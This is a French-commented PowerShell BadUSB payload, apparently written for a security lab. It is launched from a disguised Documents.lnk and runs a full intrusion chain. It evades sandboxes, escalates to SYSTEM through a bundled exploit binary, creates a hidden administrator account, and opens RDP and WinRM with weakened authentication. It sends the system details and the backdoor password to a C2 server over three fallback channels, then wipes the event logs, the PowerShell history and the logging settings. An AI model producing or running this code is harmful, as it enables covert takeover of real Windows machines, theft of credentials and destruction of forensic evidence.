# ==============================================================
# payload.ps1 – Charge utile BadUSB (Partie 1)
# Objectif pédagogique : TP sécurité offensive / défensive
#
# Scénario (déclenchement par double-clic sur Documents.lnk) :
#   1. Anti-analyse  : détection sandbox/VM + outils de débogage
#   2. Élévation     : RedSun (LPE – se relance automatiquement en SYSTEM)
#   3. Backdoor      : création d'un compte ADMINISTRATEUR caché (svc_XXXXXX)
#   4. Accès distant : activation RDP + WinRM + règles pare-feu (FR + EN)
#   5. Exfiltration  : AES-256-GCM → POST JSON → Base64 GET (3 canaux)
#   6. Couverture    : nettoyage des journaux et de l'historique
#
# Prérequis USB (tous fichiers, les non-.lnk en attribut Hidden) :
#   - payload.ps1       (ce fichier)
#   - RedSun.exe        (LPE exploit – même dossier)
#   - launcher.vbs      (lanceur silencieux invoqué par le .lnk)
#   - Documents.lnk     (raccourci visible – généré par create_shortcut.vbs)
#
# CONFIGURATION AVANT DÉPLOIEMENT :
#   1. Modifier $c2Base  → IP du serveur C2 (machine Kali)
#   2. Optionnel : générer une clé AES et la placer dans $c2AesKeyHex
#      python -c "import secrets; print(secrets.token_hex(32))"
#      + passer la même valeur à server.py --key <hex>
# ==============================================================

$ErrorActionPreference = "SilentlyContinue"

# ──────────────────────────────────────────────────────────────
# 0. CHEMIN DU SCRIPT (robuste depuis un appel via .lnk / wscript)
# ──────────────────────────────────────────────────────────────

$scriptDir = if ($PSScriptRoot -and $PSScriptRoot -ne "") {
    $PSScriptRoot
} else {
    Split-Path -Parent $MyInvocation.MyCommand.Definition
}
$scriptPath = Join-Path $scriptDir "payload.ps1"

# ──────────────────────────────────────────────────────────────
# 1. MÉCANISMES ANTI-ANALYSE / ANTI-SANDBOX
# ──────────────────────────────────────────────────────────────

function Test-Sandbox {

    # 1-a. Processus propres aux hyperviseurs courants
    $vmProcs = @(
        "vmtoolsd","vmwaretray","vmwareuser","vmacthlp",
        "vboxservice","vboxtray","vgauthservice",
        "vmnat","vmnetdhcp","vmware-vmx"
    )
    foreach ($p in $vmProcs) {
        if (Get-Process -Name $p -EA 0) { return $true }
    }

    # 1-b. Outils d'analyse dynamique / reverse engineering
    $analysisProcs = @(
        "procmon","procmon64","processhacker","procexp","procexp64",
        "wireshark","fiddler","charles","burpsuite",
        "ollydbg","x64dbg","x32dbg","ida","ida64",
        "immunitydebugger","windbg","pestudio","die"
    )
    foreach ($p in $analysisProcs) {
        if (Get-Process -Name $p -EA 0) { return $true }
    }

    # 1-c. Mémoire RAM insuffisante (< 2 Go = sandbox probable)
    $ram = (Get-CimInstance -ClassName Win32_ComputerSystem -EA 0).TotalPhysicalMemory
    if ($ram -and $ram -lt 2147483648) { return $true }

    # 1-d. Nombre de cœurs logiques trop faible
    $cores = (Get-CimInstance -ClassName Win32_Processor -EA 0).NumberOfLogicalProcessors
    if ($cores -and $cores -lt 2) { return $true }

    # 1-e. Espace disque total trop faible (< 50 Go)
    $diskTotal = (Get-CimInstance -ClassName Win32_DiskDrive -EA 0 |
                  Measure-Object -Property Size -Sum).Sum
    if ($diskTotal -and $diskTotal -lt 53687091200) { return $true }

    # 1-f. Clés de registre typiques des environnements virtuels
    $vmRegKeys = @(
        "HKLM:\SOFTWARE\VMware, Inc.\VMware Tools",
        "HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions",
        "HKLM:\SYSTEM\CurrentControlSet\Services\VBoxGuest"
    )
    foreach ($k in $vmRegKeys) {
        if (Test-Path $k) { return $true }
    }

    return $false
}

# Abandon silencieux si environnement suspect
if (Test-Sandbox) { exit }

# Légère pause pour échapper à l'analyse comportementale à chaud
Start-Sleep -Milliseconds 800

# ──────────────────────────────────────────────────────────────
# 2. ÉLÉVATION DE PRIVILÈGES AVEC RedSun (LPE via Defender)
#
#    Flux :
#    • Première exécution (compte standard) → RedSun.exe est invoqué
#      en lui passant la ligne de commande PowerShell à exécuter en
#      SYSTEM. RedSun élève et relance automatiquement payload.ps1.
#    • Deuxième exécution (SYSTEM) → Test-Admin retourne $true,
#      le payload continue vers les étapes 3-6.
# ──────────────────────────────────────────────────────────────

function Test-Admin {
    $id = [Security.Principal.WindowsIdentity]::GetCurrent()
    return ([Security.Principal.WindowsPrincipal]$id).IsInRole(
        [Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-Admin)) {
    $redsunPath = Join-Path $scriptDir "RedSun.exe"
    if (Test-Path $redsunPath) {
        $psExe  = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
        $psArgs = "-WindowStyle Hidden -NonInteractive -ExecutionPolicy Bypass " +
                  "-NoProfile -File `"$scriptPath`""
        # Passe la commande à exécuter en SYSTEM à RedSun
        Start-Process -FilePath $redsunPath `
                      -ArgumentList "$psExe $psArgs" `
                      -WindowStyle Hidden
        Start-Sleep -Seconds 10
    }
    exit
}

# ──────────────────────────────────────────────────────────────
# 3. CRÉATION DU COMPTE ADMINISTRATEUR CACHÉ
# ──────────────────────────────────────────────────────────────

$charset      = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
$suffix       = -join ($charset.ToCharArray() | Get-Random -Count 6)
$backdoorUser = "svc_" + $suffix

$pwChars      = $charset + "!@#$%^&*()-_=+"
$backdoorPass = -join ($pwChars.ToCharArray() | Get-Random -Count 18)

# 3-a. Création du compte (New-LocalUser en priorité, net user en repli)
$secPass = ConvertTo-SecureString $backdoorPass -AsPlainText -Force
try {
    New-LocalUser -Name $backdoorUser -Password $secPass `
                  -FullName "Service Account" -Description "Service Account" `
                  -PasswordNeverExpires -ErrorAction Stop | Out-Null
} catch {
    $null = net user $backdoorUser $backdoorPass /add /expires:never `
            /passwordreq:yes /comment:"Service Account" 2>&1
}

# 3-b. Ajout au groupe Administrateurs (noms français ET anglais)
foreach ($grp in @("Administrators", "Administrateurs")) {
    try { Add-LocalGroupMember -Group $grp -Member $backdoorUser -EA Stop }
    catch {}
}
$null = net localgroup Administrators $backdoorUser /add 2>&1

# 3-c. Ajout au groupe Bureau à distance (noms français ET anglais)
foreach ($grp in @("Remote Desktop Users", "Utilisateurs du Bureau à distance")) {
    try { Add-LocalGroupMember -Group $grp -Member $backdoorUser -EA Stop }
    catch {}
}
$null = net localgroup "Remote Desktop Users" $backdoorUser /add 2>&1

# 3-d. Désactivation de l'expiration du mot de passe
$null = wmic useraccount where "Name='$backdoorUser'" set PasswordExpires=FALSE 2>&1

# 3-e. Masquage du compte sur l'écran de connexion Windows
$loginHideKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
$null = New-ItemProperty -Path $loginHideKey -Name $backdoorUser `
        -Value 0 -PropertyType DWORD -Force 2>&1

# ──────────────────────────────────────────────────────────────
# 4. ACTIVATION DE L'ACCÈS DISTANT (RDP + WinRM)
# ──────────────────────────────────────────────────────────────

# ── 4-a. Remote Desktop Protocol (RDP) ──────────────────────
$null = Set-ItemProperty `
        -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" `
        -Name "fDenyTSConnections" -Value 0 -Force 2>&1
# Désactivation de l'authentification NLA
$null = Set-ItemProperty `
        -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" `
        -Name "UserAuthentication" -Value 0 -Force 2>&1

# Service Terminal Services (TermService)
Set-Service  -Name TermService -StartupType Automatic -EA 0
Start-Service -Name TermService -EA 0

# Règles pare-feu RDP (noms français ET anglais + noms de règles individuelles)
foreach ($grp in @("Remote Desktop", "Bureau à distance")) {
    $null = Enable-NetFirewallRule -DisplayGroup $grp 2>&1
}
foreach ($rule in @("RemoteDesktop-UserMode-In-TCP", "RemoteDesktop-UserMode-In-UDP")) {
    $null = Enable-NetFirewallRule -Name $rule 2>&1
}

# ── 4-b. Windows Remote Management (WinRM / PowerShell distant) ──
$null = Enable-PSRemoting -Force -SkipNetworkProfileCheck 2>&1
$null = Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force 2>&1
$null = Set-Service  -Name WinRM -StartupType Automatic 2>&1
$null = Start-Service -Name WinRM 2>&1

# ── 4-c. Règles pare-feu complémentaires (tous profils) ──────
$null = netsh advfirewall firewall add rule `
        name="BackdoorRemoteAccess" protocol=TCP dir=in `
        localport=3389,5985,5986 action=allow profile=any 2>&1

# ──────────────────────────────────────────────────────────────
# 5. COLLECTE D'INFORMATIONS ET EXFILTRATION VERS LE SERVEUR C2
# ──────────────────────────────────────────────────────────────

# Récupération de l'adresse IP publique (plusieurs sources de secours)
$publicIP = "Inconnue"
foreach ($svc in @("https://api.ipify.org",
                   "https://checkip.amazonaws.com",
                   "https://icanhazip.com")) {
    try {
        $publicIP = (Invoke-WebRequest -Uri $svc -UseBasicParsing -TimeoutSec 5).Content.Trim()
        if ($publicIP -match '^\d{1,3}(\.\d{1,3}){3}$') { break }
    } catch {}
}

# Adresse IP locale principale (interface non-loopback)
$localIP = (Get-NetIPAddress -AddressFamily IPv4 -EA 0 |
            Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } |
            Select-Object -First 1).IPAddress

# Informations système collectées
$sysInfo = @{
    computer_name = $env:COMPUTERNAME
    domain        = $env:USERDOMAIN
    current_user  = $env:USERNAME
    os_version    = (Get-CimInstance Win32_OperatingSystem -EA 0).Caption
    local_ip      = $localIP
    public_ip     = $publicIP
    backdoor_user = $backdoorUser
    backdoor_pass = $backdoorPass
    rdp_port      = 3389
    winrm_port    = 5985
    timestamp     = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
}

$jsonData = $sysInfo | ConvertTo-Json -Compress

# ── Configuration C2 ─────────────────────────────────────────
# !! MODIFIER L'IP CI-DESSOUS avant déploiement !!
$c2Base = "http://10.10.1.32:8080"

# Clé AES-256 partagée (32 octets hex).
# Laisser à la valeur nulle pour utiliser directement le canal JSON en clair.
# Pour activer le chiffrement :
#   python -c "import secrets; print(secrets.token_hex(32))"
#   + passer la même valeur à server.py --key <hex>
$c2AesKeyHex = "0000000000000000000000000000000000000000000000000000000000000000"

# ── Tentative 1 : AES-256-GCM (si clé non nulle) ─────────────
$sent = $false
if ($c2AesKeyHex -notmatch '^0+$') {
    try {
        $keyBytes   = [byte[]] ($c2AesKeyHex -split '(?<=\G..)' -ne '' |
                      ForEach-Object { [Convert]::ToByte($_, 16) })
        $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($jsonData)
        $nonce      = [byte[]]::new(12)
        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($nonce)
        $aesGcm = [System.Security.Cryptography.AesGcm]::new($keyBytes)
        $cipher = [byte[]]::new($plainBytes.Length)
        $tag    = [byte[]]::new(16)
        $aesGcm.Encrypt($nonce, $plainBytes, $cipher, $tag)
        $aesGcm.Dispose()
        $blob = $nonce + $tag + $cipher
        $resp = Invoke-WebRequest -Uri "$c2Base/enc" -Method POST `
                -Body $blob -ContentType "application/octet-stream" `
                -UseBasicParsing -TimeoutSec 8
        if ($resp.StatusCode -eq 200) { $sent = $true }
    } catch {}
}

# ── Tentative 2 : POST JSON en clair (principal) ─────────────
if (-not $sent) {
    try {
        $resp = Invoke-WebRequest -Uri "$c2Base/collect" -Method POST `
                -Body $jsonData -ContentType "application/json" `
                -UseBasicParsing -TimeoutSec 8
        if ($resp.StatusCode -eq 200) { $sent = $true }
    } catch {}
}

# ── Tentative 3 : Base64 GET (repli) ─────────────────────────
if (-not $sent) {
    try {
        $b64 = [Convert]::ToBase64String(
                   [System.Text.Encoding]::UTF8.GetBytes($jsonData))
        $null = Invoke-WebRequest -Uri "$c2Base/b64?d=$b64" `
                -UseBasicParsing -TimeoutSec 8
    } catch {}
}

# ──────────────────────────────────────────────────────────────
# 6. EFFACEMENT DES TRACES (COUVERTURE)
# ──────────────────────────────────────────────────────────────

# Journaux d'événements Windows
foreach ($log in @("System","Application","Security",
                   "Windows PowerShell",
                   "Microsoft-Windows-PowerShell/Operational")) {
    $null = wevtutil cl "$log" 2>&1
}

# Historique des commandes PowerShell
$histFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path $histFile) { $null = Remove-Item $histFile -Force 2>&1 }

# Fichiers Prefetch (traces d'exécution)
$null = Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force 2>&1

# Désactivation de la journalisation PowerShell
$psLogKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
$null = Set-ItemProperty -Path "$psLogKey\ScriptBlockLogging" `
        -Name "EnableScriptBlockLogging" -Value 0 -Force 2>&1
$null = Set-ItemProperty -Path "$psLogKey\Transcription" `
        -Name "EnableTranscripting"      -Value 0 -Force 2>&1
